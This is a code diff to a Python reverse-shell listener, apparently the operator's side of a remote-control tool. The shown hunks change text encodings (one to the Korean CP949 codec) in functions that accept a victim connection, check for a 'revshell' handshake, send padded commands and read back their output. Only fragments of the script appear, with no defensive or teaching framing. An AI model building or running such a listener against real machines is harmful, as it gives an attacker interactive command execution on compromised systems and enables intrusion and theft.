@@ -12,7 +12,7 @@ def receive(client):
         connection = select.select([client], [], [], 0.5)
         if (connection[0]):
             data = client.recv(4096)
-            out += data.decode('utf-8')
+            out += data.decode('CP949')
         else:
             break
 
@@ -24,7 +24,7 @@ sock.listen(5)
 
 client, addr = sock.accept()
 
-out = client.recv(1024).decode('utf-8')
+out = client.recv(1024).decode()
 
 if (out != "revshell"):
     print("[!] Incoming protocol is not a reverse shell. Exiting.")
@@ -37,13 +37,13 @@ while True:
     request = cmd + ("0" * (1024 - len(cmd)))
 
     if (cmd == "shut"):
-        client.send(request.encode('utf-8'))
+        client.send(request.encode())
         print("[*] Closing remote socket...")
         exit(0)
     elif (cmd == "clear"):
         os.system("clear")
     else:
-        client.send(request.encode('utf-8'))
+        client.send(request.encode())
         t = threading.Thread(target=receive, args=(client,))
         t.start()
         time.sleep(1)
